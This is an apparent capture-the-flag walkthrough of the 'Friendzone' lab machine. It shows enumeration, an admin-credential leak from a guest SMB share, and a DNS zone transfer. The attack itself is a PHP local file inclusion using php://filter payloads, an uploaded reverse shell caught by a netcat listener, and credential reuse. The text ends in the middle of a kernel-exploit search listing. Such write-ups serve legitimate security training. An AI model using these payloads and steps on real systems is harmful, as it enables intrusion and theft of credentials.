# Friendzone

```
kali@kali:~/htb/Friendzone$ sudo nmap -p- -sC -sV 10.129.1.225
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-09 02:42 EST
Nmap scan report for 10.129.1.225
Host is up (0.028s latency).
Not shown: 65528 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Friend Zone Escape software
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  ssl/http    Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 404 Not Found
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
| Not valid before: 2018-10-05T21:02:30
|_Not valid after:  2018-11-04T21:02:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -39m26s, deviation: 1h09m16s, median: 32s
|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: friendzone
|   NetBIOS computer name: FRIENDZONE\x00
|   Domain name: \x00
|   FQDN: friendzone
|_  System time: 2021-02-09T09:43:48+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-02-09T07:43:48
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.51 seconds
kali@kali:~/htb/Friendzone$ 
```

The webpage is just an image.

I check the smb and see that we have read/write access to the Development disk:


```
kali@kali:~/htb/Friendzone$ smbmap -H 10.129.1.225
[+] Guest session       IP: 10.129.1.225:445    Name: 10.129.1.225                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        Files                                                   NO ACCESS       FriendZone Samba Server Files /etc/Files
        general                                                 READ ONLY       FriendZone Samba Server Files
        Development                                             READ, WRITE     FriendZone Samba Server Files
        IPC$                                                    NO ACCESS       IPC Service (FriendZone server (Samba, Ubuntu))
kali@kali:~/htb/Friendzone$ 
```

I check the development disk with smbclient:

```
kali@kali:~/htb/Friendzone$ smbclient //10.129.1.225/Development -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Feb  9 03:22:31 2021
  ..                                  D        0  Mon Sep 28 08:19:07 2020

                9221460 blocks of size 1024. 6371540 blocks available
smb: \> mkdir test
smb: \> ls
  .                                   D        0  Tue Feb  9 03:28:24 2021
  ..                                  D        0  Mon Sep 28 08:19:07 2020
  test                                D        0  Tue Feb  9 03:28:24 2021

                9221460 blocks of size 1024. 6371536 blocks available
smb: \> 
```


I also check the general disk:


```
kali@kali:~/htb/Friendzone$ smbclient //10.129.1.225/general -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jan 16 15:10:51 2019
  ..                                  D        0  Mon Sep 28 08:19:07 2020
  creds.txt                           N       57  Tue Oct  9 19:52:42 2018

                9221460 blocks of size 1024. 6366756 blocks available
smb: \> help
?              allinfo        altname        archive        backup         
blocksize      cancel         case_sensitive cd             chmod          
chown          close          del            deltree        dir            
du             echo           exit           get            getfacl        
geteas         hardlink       help           history        iosize         
lcd            link           lock           lowercase      ls             
l              mask           md             mget           mkdir          
more           mput           newer          notify         open           
posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir    
posix_unlink   posix_whoami   print          prompt         put            
pwd            q              queue          quit           readlink       
rd             recurse        reget          rename         reput          
rm             rmdir          showacls       setea          setmode        
scopy          stat           symlink        tar            tarmode        
timeout        translate      unlock         volume         vuid           
wdel           logon          listconnect    showconnect    tcon           
tdis           tid            utimes         logoff         ..             
!              
smb: \> more creds.txt
getting file \creds.txt of size 57 as /tmp/smbmore.rGahZA (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)
smb: \> 


creds for the admin THING:

admin:WORKWORKHhallelujah@#
```


I tried this on the ftp server:

```
kali@kali:~/htb/Friendzone$ ftp 10.129.1.225
Connected to 10.129.1.225.
220 (vsFTPd 3.0.3)
Name (10.129.1.225:kali): admin
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp> 
```


I edit the /etc/hosts file to include "friendzone.red" as seen in the nmap scan.

I go over to "https://friendzone.red/" and get a gif.

I check the page source and see:

```
<!-- Just doing some development here -->
<!-- /js/js -->
<!-- Don't go deep ;) -->
```

Over at /js/js It says:

```
<p>Testing some functions !</p><p>I'am trying not to break things !</p>Qmo0MXljakx5YzE2MTI4NjE0NjdxdEJySWJlMzRJ<!-- dont stare too much , you will be smashed ! , it's all about times and zones ! --> 
```

I try decoding this with base64, but the result does not make sense:

```
kali@kali:~$ echo "Qmo0MXljakx5YzE2MTI4NjE0NjdxdEJySWJlMzRJ" | base64 -d ; echo
Bj41ycjLyc1612861467qtBrIbe34I
kali@kali:~$ 
```

I run amass and dig:


```
kali@kali:~/htb/Friendzone$ amass enum --passive -d friendzone.red
Querying Ask for friendzone.red subdomains
Querying HackerOne for friendzone.red subdomains                                                                                            
Querying ViewDNS for friendzone.red subdomains                                                                                              
Querying LoCArchive for friendzone.red subdomains                                                                                           
Querying VirusTotal for friendzone.red subdomains                                                                                           
Querying GoogleCT for friendzone.red subdomains                                                                                             
Querying UKGovArchive for friendzone.red subdomains                                                                                         
Querying ThreatMiner for friendzone.red subdomains                                                                                          
Querying ArchiveIt for friendzone.red subdomains                                                                                            
Querying Mnemonic for friendzone.red subdomains                                                                                             
Querying CommonCrawl for friendzone.red subdomains                                                                                          
Querying SiteDossier for friendzone.red subdomains                                                                                          
Querying Yahoo for friendzone.red subdomains                                                                                                
Querying Baidu for friendzone.red subdomains                                                                                                
Querying URLScan for friendzone.red subdomains                                                                                              
Querying HackerTarget for friendzone.red subdomains                                                                                         
Querying ThreatCrowd for friendzone.red subdomains                                                                                          
hostmaster.hostmaster.www.admin.friendzone.red                                                                                              
hostmaster.www.administartor1.friendzone.red
hostmaster.hostmaster.hostmaster.www.adminsitrator1.friendzone.red
imports.friendzone.red
hostmaster.hostmaster.www.admnistrator1.friendzone.red
www.adminisitrator1.friendzone.red
hr.friendzone.red
hostmaster.hostmaster.www.development.friendzone.red
hostmaster.imports.friendzone.red
hostmaster.hostmaster.hostmaster.uploads.friendzone.red
hostmaster.hostmaster.hostmaster.www.hr.friendzone.red
hostmaster.administrator1.friendzone.red
hostmaster.www.adminisitrator1.friendzone.red
hostmaster.www.admin1.friendzone.red
hostmaster.admin1.friendzone.red
hostmaster.www.friendzone.red
hostmaster.hostmaster.hostmaster.www.admin.friendzone.red
hostmaster.administartor1.friendzone.red
hostmaster.www.admnistrator1.friendzone.red
hostmaster.hostmaster.hostmaster.www.administrator1.friendzone.red
hostmaster.hostmaster.hostmaster.adminsitrator1.friendzone.red
hostmaster.hostmaster.www.friendzone.red
hostmaster.hostmaster.www.hs.friendzone.red
hostmaster.www.uploads.friendzone.red
www.hostmaster.friendzone.red
hostmaster.hostmaster.admnistrator1.friendzone.red
hostmaster.hostmaster.hostmaster.admin1.friendzone.red
hostmaster.hostmaster.hostmaster.www.friendzone.red
hostmaster.hostmaster.hostmaster.upload.friendzone.red
upload.friendzone.red
hostmaster.hostmaster.www.administartor1.friendzone.red
hostmaster.adminnistrator1.friendzone.red
hostmaster.hostmaster.administrato1.friendzone.red
hostmaster.hs.friendzone.red
hostmaster.www.files.friendzone.red
hostmaster.hostmaster.files.friendzone.red
hostmaster.files.friendzone.red
www.uploads.friendzone.red
uploads.friendzone.red
hostmaster.hostmaster.hostmaster.www.hs.friendzone.red
hostmaster.hostmaster.hostmaster.adminstrator1.friendzone.red
hostmaster.adminsitrator1.friendzone.red
hostmaster.www.hostmaster.friendzone.red
hostmaster.hostmaster.www.uplaods.friendzone.red
hostmaster.www.adminstrator1.friendzone.red
development.friendzone.red
hostmaster.hostmaster.www.hr.friendzone.red
hostmaster.hostmaster.hostmaster.vpn.friendzone.red
hostmaster.hostmaster.adminstrator1.friendzone.red
hostmaster.hostmaster.hostmaster.adminnistrator1.friendzone.red
hostmaster.www.administratror1.friendzone.red
hostmaster.friendzone.red
adminnistrator1.friendzone.red
hostmaster.hostmaster.hostmaster.imports.friendzone.red
hostmaster.hostmaster.www.files.friendzone.red
hostmaster.hostmaster.hostmaster.www.vpn.friendzone.red
hostmaster.vpn.friendzone.red
hostmaster.hostmaster.www.haha.friendzone.red
hostmaster.adminstrator1.friendzone.red
adminsitrator1.friendzone.red
www.administrator1.friendzone.red
www.administratror1.friendzone.red
hostmaster.hostmaster.adminnistrator1.friendzone.red
files.friendzone.red
hostmaster.hostmaster.hostmaster.www.imports.friendzone.red
hostmaster.hostmaster.www.administrator.friendzone.red
hostmaster.hostmaster.hostmaster.www.admnistrator1.friendzone.red
hostmaster.hostmaster.adminisitrator1.friendzone.red
administartor1.friendzone.red
hostmaster.www.vpn.friendzone.red
hostmaster.hostmaster.www.adminstrator1.friendzone.red
www.admnistrator1.friendzone.red
hostmaster.hostmaster.www.administrator1.friendzone.red
hostmaster.hostmaster.hostmaster.adminisitrator1.friendzone.red
hostmaster.hostmaster.hostmaster.www.administratror1.friendzone.red
hostmaster.hostmaster.administratror1.friendzone.red
admnistrator1.friendzone.red
hs.friendzone.red
hostmaster.hostmaster.uplaods.friendzone.red
hostmaster.hostmaster.www.uploads.friendzone.red
hostmaster.uploads.friendzone.red
hostmaster.hostmaster.hostmaster.www.administrator.friendzone.red
hostmaster.hostmaster.hostmaster.www.upload.friendzone.red
hostmaster.hostmaster.hostmaster.administartor1.friendzone.red
www.imports.friendzone.red
hostmaster.hostmaster.www.imports.friendzone.red
hostmaster.hostmaster.hostmaster.www.files.friendzone.red
hostmaster.hostmaster.hostmaster.www.haha.friendzone.red
www.administartor1.friendzone.red
hostmaster.administrato1.friendzone.red
hostmaster.hostmaster.www.admin1.friendzone.red
hostmaster.hostmaster.hostmaster.development.friendzone.red
hostmaster.www.hr.friendzone.red
hostmaster.hostmaster.hostmaster.www.hostmaster.friendzone.red
www.admin1.friendzone.red
hostmaster.hostmaster.uploads.friendzone.red
www.hs.friendzone.red
www.administrator.friendzone.red
hostmaster.hr.friendzone.red
hostmaster.hostmaster.admin.friendzone.red
www.adminstrator1.friendzone.red
hostmaster.www.administrator1.friendzone.red
www.adminsitrator1.friendzone.red
hostmaster.development.friendzone.red
hostmaster.hostmaster.hostmaster.administrato1.friendzone.red
hostmaster.hostmaster.www.administrato1.friendzone.red
hostmaster.hostmaster.hostmaster.hr.friendzone.red
hostmaster.hostmaster.haha.friendzone.red
52959.friendzone.red
hostmaster.hostmaster.hostmaster.files.friendzone.red
hostmaster.hostmaster.hostmaster.administrator1.friendzone.red
hostmaster.hostmaster.hostmaster.hs.friendzone.red
hostmaster.hostmaster.hostmaster.www.uploads.friendzone.red
hostmaster.haha.friendzone.red
hostmaster.hostmaster.www.adminnistrator1.friendzone.red
hostmaster.www.imports.friendzone.red
www.hr.friendzone.red
hostmaster.hostmaster.hostmaster.admin.friendzone.red
hostmaster.hostmaster.administartor1.friendzone.red
hostmaster.hostmaster.adminsitrator1.friendzone.red
hostmaster.hostmaster.hostmaster.www.administrato1.friendzone.red
administratror1.friendzone.red
uplaods.friendzone.red
hostmaster.hostmaster.www.administratror1.friendzone.red
hostmaster.administratror1.friendzone.red
hostmaster.www.administrato1.friendzone.red
www.development.friendzone.red
www.haha.friendzone.red
hostmaster.hostmaster.admin1.friendzone.red
admin1.friendzone.red
hostmaster.hostmaster.development.friendzone.red
hostmaster.hostmaster.www.vpn.friendzone.red
hostmaster.hostmaster.hostmaster.www.adminstrator1.friendzone.red
hostmaster.admnistrator1.friendzone.red
hostmaster.hostmaster.administrator1.friendzone.red
hostmaster.hostmaster.www.adminsitrator1.friendzone.red
hostmaster.hostmaster.hostmaster.www.admin1.friendzone.red
hostmaster.www.development.friendzone.red
hostmaster.hostmaster.hs.friendzone.red
hostmaster.hostmaster.upload.friendzone.red
hostmaster.hostmaster.hostmaster.www.adminnistrator1.friendzone.red
hostmaster.www.hs.friendzone.red
hostmaster.hostmaster.www.hostmaster.friendzone.red
hostmaster.hostmaster.hostmaster.friendzone.red
www.vpn.friendzone.red
hostmaster.hostmaster.www.upload.friendzone.red
hostmaster.adminisitrator1.friendzone.red
hostmaster.administrator.friendzone.red
administrator1.friendzone.red
haha.friendzone.red
hostmaster.uplaods.friendzone.red
hostmaster.hostmaster.administrator.friendzone.red
hostmaster.upload.friendzone.red
hostmaster.www.haha.friendzone.red
hostmaster.www.adminsitrator1.friendzone.red
administrator.friendzone.red
hostmaster.hostmaster.hostmaster.administratror1.friendzone.red
hostmaster.hostmaster.www.adminisitrator1.friendzone.red
www.uplaods.friendzone.red
hostmaster.www.administrator.friendzone.red
hostmaster.admin.friendzone.red
www.upload.friendzone.red
www.adminnistrator1.friendzone.red
www.friendzone.red
adminstrator1.friendzone.red
hostmaster.hostmaster.imports.friendzone.red
hostmaster.hostmaster.hr.friendzone.red
hostmaster.hostmaster.vpn.friendzone.red
hostmaster.www.admin.friendzone.red
hostmaster.www.upload.friendzone.red
hostmaster.hostmaster.hostmaster.haha.friendzone.red
admin.friendzone.red
www.administrato1.friendzone.red
www.files.friendzone.red
hostmaster.hostmaster.hostmaster.uplaods.friendzone.red
hostmaster.hostmaster.hostmaster.www.administartor1.friendzone.red
hostmaster.hostmaster.hostmaster.www.adminisitrator1.friendzone.red
adminisitrator1.friendzone.red
administrato1.friendzone.red
hostmaster.hostmaster.hostmaster.www.uplaods.friendzone.red
hostmaster.hostmaster.friendzone.red
vpn.friendzone.red
www.admin.friendzone.red
hostmaster.www.adminnistrator1.friendzone.red
friendzone.red
hostmaster.www.uplaods.friendzone.red
hostmaster.hostmaster.hostmaster.administrator.friendzone.red
hostmaster.hostmaster.hostmaster.admnistrator1.friendzone.red
hostmaster.hostmaster.hostmaster.www.development.friendzone.red
Querying BufferOver for friendzone.red subdomains
Querying Bing for friendzone.red subdomains                                                                                                 
Querying DNSDumpster for friendzone.red subdomains                                                                                          
Querying Robtex for friendzone.red subdomains                                                                                               
Querying Riddler for friendzone.red subdomains                                                                                              
Querying Sublist3rAPI for friendzone.red subdomains                                                                                         
Querying Pastebin for friendzone.red subdomains                                                                                             
Querying CertSpotter for friendzone.red subdomains                                                                                          
Querying RapidDNS for friendzone.red subdomains                                                                                             
www.97992552959.friendzone.red                                                                                                              
97992552959.friendzone.red
Querying BuiltWith for friendzone.red subdomains
Querying Brute Forcing for friendzone.red subdomains                                                                                        
Querying Crtsh for friendzone.red subdomains                                                                                                
Querying Censys for friendzone.red subdomains                                                                                               
Querying Wayback for friendzone.red subdomains                                                                                              
Querying AlienVault for friendzone.red subdomains                                                                                           
kali@kali:~/htb/Friendzone$ dig @10.129.1.225 friendzone.red axfr

; <<>> DiG 9.11.16-2-Debian <<>> @10.129.1.225 friendzone.red axfr
; (1 server found)
;; global options: +cmd
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
friendzone.red.         604800  IN      AAAA    ::1
friendzone.red.         604800  IN      NS      localhost.
friendzone.red.         604800  IN      A       127.0.0.1
administrator1.friendzone.red. 604800 IN A      127.0.0.1
hr.friendzone.red.      604800  IN      A       127.0.0.1
uploads.friendzone.red. 604800  IN      A       127.0.0.1
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 28 msec
;; SERVER: 10.129.1.225#53(10.129.1.225)
;; WHEN: Tue Feb 09 03:59:37 EST 2021
;; XFR size: 8 records (messages 1, bytes 289)

kali@kali:~/htb/Friendzone$ 
```

So administrator1, and uploads seem to be good subdomians here.

I add those to my /etc/hosts file as well

administrator1.friendzone.red leads to a login form.


After logging in we get: "Login Done ! visit /dashboard.php"

This gives:

```

Smart photo script for friendzone corp !
* Note : we are dealing with a beginner php developer and the application is not tested yet !


image_name param is missed !

please enter it to show the image

default is image_id=a.jpg&pagename=timestamp
```

So I add that as the parametres:

`https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=timestamp`

And get an image and some text:

```
Something went worng ! , the script include wrong param !
Final Access timestamp is 1612865981
```

I try to get some local file inclusion by changing the parametr to stuff like:

`?image_id=a.jpg&pagename=file:///etc/hosts`

But it returns nothing.

I google some more LFI techniques and find this: https://gupta-bless.medium.com/exploiting-local-file-inclusion-lfi-using-php-wrapper-89904478b225

So I just change this to dashboard:

`?image_id=a.jpg&pagename=php://filter/convert.base64-encode/resource=dashboard`

And I get the base64 encoded string of the dashboard.php page:

```
PD9waHAKCi8vZWNobyAiPGNlbnRlcj48aDI+U21hcnQgcGhvdG8gc2NyaXB0IGZvciBmcmllbmR6b25lIGNvcnAgITwvaDI+PC9jZW50ZXI+IjsKLy9lY2hvICI8Y2VudGVyPjxoMz4qIE5vdGUgOiB3ZSBhcmUgZGVhbGluZyB3aXRoIGEgYmVnaW5uZXIgcGhwIGRldmVsb3BlciBhbmQgdGhlIGFwcGxpY2F0aW9uIGlzIG5vdCB0ZXN0ZWQgeWV0ICE8L2gzPjwvY2VudGVyPiI7CmVjaG8gIjx0aXRsZT5GcmllbmRab25lIEFkbWluICE8L3RpdGxlPiI7CiRhdXRoID0gJF9DT09LSUVbIkZyaWVuZFpvbmVBdXRoIl07CgppZiAoJGF1dGggPT09ICJlNzc0OWQwZjRiNGRhNWQwM2U2ZTkxOTZmZDFkMThmMSIpewogZWNobyAiPGJyPjxicj48YnI+IjsKCmVjaG8gIjxjZW50ZXI+PGgyPlNtYXJ0IHBob3RvIHNjcmlwdCBmb3IgZnJpZW5kem9uZSBjb3JwICE8L2gyPjwvY2VudGVyPiI7CmVjaG8gIjxjZW50ZXI+PGgzPiogTm90ZSA6IHdlIGFyZSBkZWFsaW5nIHdpdGggYSBiZWdpbm5lciBwaHAgZGV2ZWxvcGVyIGFuZCB0aGUgYXBwbGljYXRpb24gaXMgbm90IHRlc3RlZCB5ZXQgITwvaDM+PC9jZW50ZXI+IjsKCmlmKCFpc3NldCgkX0dFVFsiaW1hZ2VfaWQiXSkpewogIGVjaG8gIjxicj48YnI+IjsKICBlY2hvICI8Y2VudGVyPjxwPmltYWdlX25hbWUgcGFyYW0gaXMgbWlzc2VkICE8L3A+PC9jZW50ZXI+IjsKICBlY2hvICI8Y2VudGVyPjxwPnBsZWFzZSBlbnRlciBpdCB0byBzaG93IHRoZSBpbWFnZTwvcD48L2NlbnRlcj4iOwogIGVjaG8gIjxjZW50ZXI+PHA+ZGVmYXVsdCBpcyBpbWFnZV9pZD1hLmpwZyZwYWdlbmFtZT10aW1lc3RhbXA8L3A+PC9jZW50ZXI+IjsKIH1lbHNlewogJGltYWdlID0gJF9HRVRbImltYWdlX2lkIl07CiBlY2hvICI8Y2VudGVyPjxpbWcgc3JjPSdpbWFnZXMvJGltYWdlJz48L2NlbnRlcj4iOwoKIGVjaG8gIjxjZW50ZXI+PGgxPlNvbWV0aGluZyB3ZW50IHdvcm5nICEgLCB0aGUgc2NyaXB0IGluY2x1ZGUgd3JvbmcgcGFyYW0gITwvaDE+PC9jZW50ZXI+IjsKIGluY2x1ZGUoJF9HRVRbInBhZ2VuYW1lIl0uIi5waHAiKTsKIC8vZWNobyAkX0dFVFsicGFnZW5hbWUiXTsKIH0KfWVsc2V7CmVjaG8gIjxjZW50ZXI+PHA+WW91IGNhbid0IHNlZSB0aGUgY29udGVudCAhICwgcGxlYXNlIGxvZ2luICE8L2NlbnRlcj48L3A+IjsKfQo/Pgo=
```

So decode it:

```
kali@kali:~$ echo "PD9waHAKCi8vZWNobyAiPGNlbnRlcj48aDI+U21hcnQgcGhvdG8gc2NyaXB0IGZvciBmcmllbmR6b25lIGNvcnAgITwvaDI+PC9jZW50ZXI+IjsKLy9lY2hvICI8Y2VudGVyPjxoMz4qIE5vdGUgOiB3ZSBhcmUgZGVhbGluZyB3aXRoIGEgYmVnaW5uZXIgcGhwIGRldmVsb3BlciBhbmQgdGhlIGFwcGxpY2F0aW9uIGlzIG5vdCB0ZXN0ZWQgeWV0ICE8L2gzPjwvY2VudGVyPiI7CmVjaG8gIjx0aXRsZT5GcmllbmRab25lIEFkbWluICE8L3RpdGxlPiI7CiRhdXRoID0gJF9DT09LSUVbIkZyaWVuZFpvbmVBdXRoIl07CgppZiAoJGF1dGggPT09ICJlNzc0OWQwZjRiNGRhNWQwM2U2ZTkxOTZmZDFkMThmMSIpewogZWNobyAiPGJyPjxicj48YnI+IjsKCmVjaG8gIjxjZW50ZXI+PGgyPlNtYXJ0IHBob3RvIHNjcmlwdCBmb3IgZnJpZW5kem9uZSBjb3JwICE8L2gyPjwvY2VudGVyPiI7CmVjaG8gIjxjZW50ZXI+PGgzPiogTm90ZSA6IHdlIGFyZSBkZWFsaW5nIHdpdGggYSBiZWdpbm5lciBwaHAgZGV2ZWxvcGVyIGFuZCB0aGUgYXBwbGljYXRpb24gaXMgbm90IHRlc3RlZCB5ZXQgITwvaDM+PC9jZW50ZXI+IjsKCmlmKCFpc3NldCgkX0dFVFsiaW1hZ2VfaWQiXSkpewogIGVjaG8gIjxicj48YnI+IjsKICBlY2hvICI8Y2VudGVyPjxwPmltYWdlX25hbWUgcGFyYW0gaXMgbWlzc2VkICE8L3A+PC9jZW50ZXI+IjsKICBlY2hvICI8Y2VudGVyPjxwPnBsZWFzZSBlbnRlciBpdCB0byBzaG93IHRoZSBpbWFnZTwvcD48L2NlbnRlcj4iOwogIGVjaG8gIjxjZW50ZXI+PHA+ZGVmYXVsdCBpcyBpbWFnZV9pZD1hLmpwZyZwYWdlbmFtZT10aW1lc3RhbXA8L3A+PC9jZW50ZXI+IjsKIH1lbHNlewogJGltYWdlID0gJF9HRVRbImltYWdlX2lkIl07CiBlY2hvICI8Y2VudGVyPjxpbWcgc3JjPSdpbWFnZXMvJGltYWdlJz48L2NlbnRlcj4iOwoKIGVjaG8gIjxjZW50ZXI+PGgxPlNvbWV0aGluZyB3ZW50IHdvcm5nICEgLCB0aGUgc2NyaXB0IGluY2x1ZGUgd3JvbmcgcGFyYW0gITwvaDE+PC9jZW50ZXI+IjsKIGluY2x1ZGUoJF9HRVRbInBhZ2VuYW1lIl0uIi5waHAiKTsKIC8vZWNobyAkX0dFVFsicGFnZW5hbWUiXTsKIH0KfWVsc2V7CmVjaG8gIjxjZW50ZXI+PHA+WW91IGNhbid0IHNlZSB0aGUgY29udGVudCAhICwgcGxlYXNlIGxvZ2luICE8L2NlbnRlcj48L3A+IjsKfQo/Pgo=" | base64 -d ;echo
<?php

//echo "<center><h2>Smart photo script for friendzone corp !</h2></center>";
//echo "<center><h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !</h3></center>";
echo "<title>FriendZone Admin !</title>";
$auth = $_COOKIE["FriendZoneAuth"];

if ($auth === "e7749d0f4b4da5d03e6e9196fd1d18f1"){
 echo "<br><br><br>";

echo "<center><h2>Smart photo script for friendzone corp !</h2></center>";
echo "<center><h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !</h3></center>";

if(!isset($_GET["image_id"])){
  echo "<br><br>";
  echo "<center><p>image_name param is missed !</p></center>";
  echo "<center><p>please enter it to show the image</p></center>";
  echo "<center><p>default is image_id=a.jpg&pagename=timestamp</p></center>";
 }else{
 $image = $_GET["image_id"];
 echo "<center><img src='images/$image'></center>";

 echo "<center><h1>Something went worng ! , the script include wrong param !</h1></center>";
 include($_GET["pagename"].".php");
 //echo $_GET["pagename"];
 }
}else{
echo "<center><p>You can't see the content ! , please login !</center></p>";
}
?>

kali@kali:~$ 
```

Ok, maybe we can upload the file with the upload subdomain. Let's check the source code for that with the same method:

After a bit of trial and error I find it at `?image_id=a.jpg&pagename=php://filter/convert.base64-encode/resource=/var/www/uploads/upload`

```
kali@kali:~$ echo "PD9waHAKCi8vIG5vdCBmaW5pc2hlZCB5ZXQgLS0gZnJpZW5kem9uZSBhZG1pbiAhCgppZihpc3NldCgkX1BPU1RbImltYWdlIl0pKXsKCmVjaG8gIlVwbG9hZGVkIHN1Y2Nlc3NmdWxseSAhPGJyPiI7CmVjaG8gdGltZSgpKzM2MDA7Cn1lbHNlewoKZWNobyAiV0hBVCBBUkUgWU9VIFRSWUlORyBUTyBETyBIT09PT09PTUFOICEiOwoKfQoKPz4K" | base64 -d ; echo
<?php

// not finished yet -- friendzone admin !

if(isset($_POST["image"])){

echo "Uploaded successfully !<br>";
echo time()+3600;
}else{

echo "WHAT ARE YOU TRYING TO DO HOOOOOOMAN !";

}

?>

kali@kali:~$ 
```

So it does not actually upload anything.

We did have write permissions in the Development smb disk though. So maybe we can access that somehow?


```
kali@kali:~/htb/Friendzone$ smbclient //10.129.41.110/Development -N
Try "help" to get a list of possible commands.
smb: \> put php-reverse-shell.php
putting file php-reverse-shell.php as \php-reverse-shell.php (62.4 kb/s) (average 62.4 kb/s)
smb: \> ls
  .                                   D        0  Tue Feb  9 04:43:01 2021
  ..                                  D        0  Mon Sep 28 08:19:07 2020
  php-reverse-shell.php               A     5493  Tue Feb  9 04:43:01 2021

                9221460 blocks of size 1024. 6425380 blocks available
smb: \> 
```


And I found the path at `?image_id=a.jpg&pagename=/etc/Development/php-reverse-shell` eventually. Note the capitalized D in development. Took me a bit too long to figure that out.

We already knew that it would probably be in "/etc/" from the smbmap enumeration:

`        Files                                                   NO ACCESS       FriendZone Samba Server Files /etc/Files`

```
kali@kali:~/htb/Friendzone$ sudo nc -nlvp 1337
Listening on 0.0.0.0 1337
Connection received on 10.129.41.110 46008
Linux FriendZone 4.15.0-36-generic #39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
 11:44:16 up 31 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
```

Improved the shell as usual. With `script /dev/null -c bash` etc.

I looked around and found some creds:

```
www-data@FriendZone:/var/www$ cat mysql_data.conf 
for development process this is the mysql creds for user friend

db_user=friend

db_pass=Agpyu12!0.213$

db_name=FZ
www-data@FriendZone:/var/www$ su -l friend
Password: 
friend@FriendZone:~$ id
uid=1000(friend) gid=1000(friend) groups=1000(friend),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)
friend@FriendZone:~$ sudo -l
[sudo] password for friend: 
Sorry, user friend may not run sudo on FriendZone.
friend@FriendZone:~$ uname -a
Linux FriendZone 4.15.0-36-generic #39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
friend@FriendZone:~$ 
```


I searchsploit the kernel version:

```
kali@kali:~/htb/Friendzone$ searchsploit Kernel 4.15
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                            |  Path
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Apple iOS < 10.3.1 - Kernel                                                                                               | ios/local/42555.txt
Apple Mac OSX < 10.6.7 - Kernel Panic (Denial of Service)                                                                 | osx/dos/17901.c
Apple macOS < 10.12.2 / iOS < 10.2 - '_kernelrpc_mach_port_insert_right_trap' Kernel Reference Count Leak / Use-After-Fre | macos/local/40956.c
Apple macOS < 10.12.2 / iOS < 10.2 - Broken Kernel Mach Port Name uref Handling Privileged Port Name Replacement Privileg | macos/local/40957.c
Apple macOS < 10.12.2 / iOS < 10.2 Kernel - ipc_port_t Reference Count Leak Due to Incorrect externalMethod Overrides Use | multiple/dos/40955.txt
Jungo DriverWizard WinDriver < 12.4.0 - Kernel Out-of-Bounds Write Privilege Escalation                                   | windows/local/42625.py
Jungo DriverWizard WinDriver < 12.4.0 - Kernel Pool Overflow / Local Privilege Escalation (1)                             | windows/local/42624.py
Jungo DriverWizard WinDriver < 12.4.0 - Kernel Pool Overflow / Local Privilege Escalation (2)                             | windows/local/42665.py
Linux Kernel (Solaris 10 / < 5.10 138888-01) - Local Privilege Escalation                                                 | solaris/local/15962.c
Linux Kernel 2.4/2.6 (RedHat Linux 9 / Fedora Core 4 < 11 / Whitebox 4 / CentOS 4) - 'sock_sendpage()' Ring0 Privilege Es | linux/local/9479.c
Linux Kernel 4.10 < 5.1.17 - 'PTRACE_TRACEME' pkexec Local Privilege Escalation                                           | linux/local/47163.c
Linux Kernel 4.15.x < 4.19.2 - 'map_write() CAP_SYS_ADMIN' Local Privilege Escalation (cron Method)                       | linux/local/47164.sh
